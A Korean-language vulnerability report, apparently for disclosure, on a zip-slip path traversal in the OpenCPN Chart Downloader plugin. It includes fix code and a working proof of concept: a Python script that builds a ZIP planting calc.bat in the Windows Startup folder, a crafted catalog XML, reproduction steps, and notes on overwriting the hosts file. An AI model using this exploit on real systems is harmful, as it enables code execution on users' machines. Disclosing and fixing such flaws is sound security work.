---
notion_url: https://www.notion.so/e60be080983082679251014cd9d4d737
last_synced: 2026-06-12 18:07
tags: [notion-sync]
---

# Chart Downloader Plugin

1. 취약점 제목
OpenCPN Chart Downloader 플러그인의 경로 탐색(Path Traversal) 취약점을 통한 원격 코드 실행 (Windows RCE)
1. 취약점 개요 및 가능한 영향
공격자는 악성 ZIP 파일과 조작된 ENC 카탈로그 XML을 GitHub 혹은 개인 서버 등에 게시해두고, OpenCPN 사용자 커뮤니티, gitgub등을 통해 “최신 차트가 무료로 제공된다”는 메시지를 공유하며 배포합니다. 사용자가 해당 링크를 따라 Chart Downloader 플러그인에 카탈로그를 추가하도록 유도되면, 이후 업데이트 과정에서 ZIP 파일이 자동으로 다운로드 및 압축 해제되며, 이때 의도하지 않은 경로로 악성 코드가 설치될 수 있습니다.
Chart Downloader 플러그인은 외부 카탈로그(XML)의 `<zipfile_location>` URL로부터 가져온 ZIP 파일을 검증 없이 사용자가 지정한 로컬 디렉토리(`aTargetDir`)에 풀어줍니다. ZIP 내부 엔트리에 포함된 상대 경로(`../…`) 시퀀스를 제거하지 않고 그대로 결합함으로써, 플러그인 동작 권한(일반 사용자 또는 관리자)으로 임의의 경로에 파일을 덮어쓸 수 있습니다. 공격자는 선박 시스템에 물리적으로 접근할 필요 없이, 원격에서 조작된 차트 카탈로그 XML을 통해  원격 코드 실행(RCE) 을 달성할 수 있습니다.
- 영향:
  - 일반 사용자 권한으로도 `APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup` 등에 악성 배치(`calc.bat`)를 설치해, 다음 재부팅 시 자동 실행(RCE)이 되어 백도어 설치, 랜섬웨어 감염, 민감 정보 탈취 등 보안 위협으로 이어질 수 있음.
  - OpenCPN이 관리자 권한으로 실행 중일 경우, 시스템 주요 파일(예: `C:\\Windows\\System32\\drivers\\etc\\hosts`) 덮어쓰기→시스템 권한 상승.
1. 취약점이 발견된 정확한 제품명 및 버전 정보
제품명: OpenCPN Chart Downloader Plugin (`chartdldr_pi.cpp`)
영향 버전: 5.12.0-0 (가장 최신 공식 released버전)
플랫폼: Windows (Poc), Linux에서도 동일한 취약점 존재
1. 근본 원인 분석
a. 취약점에 대한 상세 설명
핵심 취약 지점은 ZIP 파일 내부 엔트리의 경로(`entry->GetName()`)를 검증 없이 `aTargetDir`과 결합해 출력하는 부분입니다.
아래 코드 흐름에서 보듯, `DownloadCharts()` → `ProcessFile()` → `ExtractZipFiles()`로 이어지며, `ExtractZipFiles()` 내에서 상대 경로(`../…`)가 제거되지 않아 디렉터리 탈출이 발생합니다.
1. `DownloadCharts()`
OCPN_downloadFileBackground(url.BuildURI(), file_path, this, &handle);

```c++
if (idx >= 0) {
  if (pPlugIn->ProcessFile(
          downloaded_p.GetFullPath(), downloaded_p.GetPath(), true,
          pPlugIn->m_pChartCatalog.charts.at(idx)->GetUpdateDatetime())) {
    cs->ChartUpdated(pPlugIn->m_pChartCatalog.charts.at(idx)->number,
                     pPlugIn->m_pChartCatalog.charts.at(idx)
                         ->GetUpdateDatetime()
                         .GetTicks());
  } else {
    m_failed_downloads++;
  }
  idx = -1;
}

```

1. `ProcessFile()`

```c++
bool chartdldr_pi::ProcessFile(const wxString &aFile,
const wxString &aTargetDir, bool aStripPath,
wxDateTime aMTime) {
if (aFile.Lower().EndsWith(_T("zip")))  // Zip compressed
{
bool ret = ExtractZipFiles(aFile, aTargetDir, aStripPath, aMTime, false);
if (ret)
wxRemoveFile(aFile);
else
wxLogError(_T("chartdldr_pi: Unable to extract: ") + aFile);
return ret;
}
```


1. `ExtractZipFiles()`

```c++
if (aStripPath) {
wxFileName fn(name);
/* We can completly replace the entry path */
// fn.SetPath(aTargetDir);
// name = fn.GetFullPath();
/* Or only remove the first dir (eg. ENC_ROOT) */
if (fn.GetDirCount() > 0) fn.RemoveDir(0);
name = aTargetDir + wxFileName::GetPathSeparator() + fn.GetFullPath();
} else {
name = aTargetDir + wxFileName::GetPathSeparator() + name;
}

if (!file) {
wxLogMessage(_T("Can not create file '") + name + _T("'."));
ret = false;
break;
}
zip.Read(file);
fn.SetTimes(&aMTime, &aMTime, &aMTime);
ret = true;
}
}
```


취약: `entry->GetName()`에 포함된 `"../"` 시퀀스를 검증/제거하지 않고 `aTargetDir + "\\\\" + name`으로 결합
- 결과적으로, 예를 들어 ZIP 내부에 `"../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/calc.bat"`를 포함시키면,
  `aTargetDir` 기준으로 상위 디렉터리 탈출 후 Startup 폴더에 악성 Bat 파일을 생성할 수 있음.
b. 입력에서 취약 지점에 이르는 코드 흐름
  1. 카탈로그 XML (`<zipfile_location>`) → 
1. `DownloadCharts()` → 원격 ZIP 다운로드
1. `ProcessFile()` → `ExtractZipFiles()` 호출
1. `ExtractZipFiles()` → ZIP 엔트리 경로 결합 및 압축 해제 → 경로 탐색 취약 발생
c. 인젝션 포인트
- 인젝션 포인트: 카탈로그 XML의 `<filename>` 필드 및 실제 ZIP 내부 엔트리 이름
- 사용자 제어 외부 입력(원격 XML, ZIP) → `GetChartFilename()` 및 `entry->GetName()`에 반영
d. 제안된 수정 방안
OpenCPN의 Chart Downloader 기능에서 압축 해제 시, 악의적인 경로(../../..)를 포함한 ZIP 파일 항목이 사용자의 의도와 무관하게 상위 디렉토리로 파일을 탈출시킬 수 있는 문제를 방지하기 위한 방안은 다음과 같다:
(1) 압축 해제 전에 경로 정규화 후 검증 (Normalize() 사용)
압축 파일 내 항목을 실제 경로로 정규화(normalize) 한 뒤, 대상 디렉토리(aTargetDir) 내부에 포함되는지 여부를 검사한다.

```c++
wxFileName outfn(aTargetDir, entry->GetName());
outfn.Normalize();  // 상대경로 → 절대경로 변환
if (!outfn.GetFullPath().StartsWith(aTargetDir + wxFileName::GetPathSeparator())) {
// 경로 탈출 시도 감지
wxLogError("Chart Downloader: Skipping unsafe path: %s", outfn.GetFullPath());
continue; // 또는 throw 예외
}
```


(2) 상대 경로 제거 (../ 시퀀스 무조건 필터링)
추가적인 방어책으로, ZIP 내 엔트리명 중 "../" 또는 "..\\" 패턴을 포함한 항목을 강제적으로 거부하거나 정리할 수 있다.

```c++
wxString zipEntryName = entry->GetName();
if (zipEntryName.Contains("..\\") || zipEntryName.Contains("../")) {
wxLogError("Skipping suspicious zip entry: %s", zipEntryName);
continue;
}
```


1. 허용된 파일 확장자 적용
허용되는 파일은 .txt, .00x 등 특정 차트 파일 확장자로 제한해야 하며, 허용된 경로 및 하위 폴더에만 파일을 저장하도록 제한해야 한다.

```c++
wxString allowed_exts[] = {"txt", ".000", ".001", ".002", "003", "004", "005", "006", "007"};
wxString ext = wxFileName(entry->GetName()).GetExt().Lower();

bool allowed = false;
for (const auto& e : allowed_exts) {
if (ext == e) {
allowed = true;
break;
}
}

if (!allowed) {
wxLogError("Chart Downloader: blocked unauthorized extension: %s", ext);
continue;
}
```


1. 개념 증명 (PoC)
a. PoC ZIP 생성 ([Poc.py](http://poc.py/))
import os
import zipfile

# 1) calc.bat 파일 생성

```python
desktop = os.getcwd()
calc_path = os.path.join(desktop, "calc.bat")
with open(calc_path, "w", newline='') as f:
f.write("@echo off\nstart calc.exe\n")
```



# 2) ZIP 파일 생성
archive_path = os.path.join(desktop, "ethical.zip")

# aTargetDir 상위 경로로 올라가도록 ../..

```python
malicious_entry = "../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/calc.bat"

with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_STORED) as zf:
zf.write(calc_path, malicious_entry)

print(f"Created:\n  BAT: {calc_path}\n  ZIP: {archive_path}")
```


- 생성된 `ethical.zip` 을 GitHub 리포지토리에 업로드
([https://github.com/Hyeonbinyoon/Poc/raw/refs/heads/main/ethical.zip](https://github.com/Hyeonbinyoon/Poc/raw/refs/heads/main/ethical.zip))
b. PoC XML 카탈로그 예시 (`catalog.xml`)

```xml
<EncProductCatalog>
<Header>
<title>Catalog PoC (Windows RCE)</title>
<date_created>07/12/2025</date_created>
<time_created>00:00:00</time_created>
<date_valid>07/12/2025</date_valid>
<time_valid>00:00:00</time_valid>
<dt_valid>2025-07-12T00:00:00Z</dt_valid>
<ref_spec>PoC ENC Product Catalog Technical Specifications</ref_spec>
<ref_spec_vers>1.0</ref_spec_vers>
<s62AgencyCode>999</s62AgencyCode>
</Header>
<cell>
<name>rce-payload</name>
<lname>Windows RCE Payload via Startup Folder</lname>
<cscale>0</cscale>
<status>Active</status>
<zipfile_location>[https://github.com/Hyeonbinyoon/Poc/raw/refs/heads/main/ethical.zip](https://github.com/Hyeonbinyoon/Poc/raw/refs/heads/main/ethical.zip)</zipfile_location>
<zipfile_datetime>20250712_000000</zipfile_datetime>
<zipfile_datetime_iso8601>2025-07-12T00:00:00Z</zipfile_datetime_iso8601>
<zipfile_size>12345</zipfile_size>
<edtn>1</edtn>
<updn>0</updn>
<uadt>2025-07-12 00:00:00</uadt>
<isdt>2025-07-12 00:00:00</isdt>
<cov>
<panel>
<panel_no>1</panel_no>
<type>E</type>
<vertex>
<lat>0</lat>
<long>0</long>
</vertex>
<vertex>
<lat>0</lat>
<long>0</long>
</vertex>
<vertex>
<lat>0</lat>
<long>0</long>
</vertex>
<vertex>
<lat>0</lat>
<long>0</long>
</vertex>
</panel>
</cov>
</cell>
</EncProductCatalog>
```


([https://gist.github.com/Hyeonbinyoon/4c7ed7dd708e8a73891a994b56246937](https://gist.github.com/Hyeonbinyoon/4c7ed7dd708e8a73891a994b56246937))
PoC 실행 방법
1. OpenCPN → tools→ options→ Chart Downloader→ Select Catalog→ Add Catalog → Custom→ name 임의로 설정→ 위 `catalog.xml` URL 입력 → Select a different directory→ 기본 경로 (C:\users\<사용자이름>\documents)선택→ Ok→ Update
1. Download Charts → 차트 선택 → Download Selected Charts 클릭
1. C:\Users\<사용자이름>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup에 calc.bat 설치됨
1. 컴퓨터 재부팅 시 `calc.exe` 자동 실행
> 추가로 구현 가능한 PoC:
사용자가 기본 디렉토리를 `C:\\Users\\<USER>\\OneDrive\\Documents` 등으로 변경해도, ../../…, ../../../… 등 `..` 개수를 달리한 여러 버전의 파일들을 zip파일 안에 생성해 두면 다른 디렉토리 구조에서도 상대 경로 탈출이 가능하다.
또한, 악성 ZIP 파일 내에 `../../../../../../../../../../Windows/System32/drivers/etc/hosts`와 같은 경로를 포함시키면, OpenCPN이 관리자 권한으로 실행된 환경에서 압축이 해제될 경우 시스템의 `hosts` 파일이 조작된다. 이로 인해 DNS 우회, 피싱, 내부망 우회 등 다양한 공격이 가능해지며, 단순 사용자 권한을 넘어선 시스템 권한 수준의 영향으로 확장된다.

# 6. 소프트웨어 다운로드 링크
- [https://opencpn.org/OpenCPN/info/downloadopencpn.html](https://opencpn.org/OpenCPN/info/downloadopencpn.html)
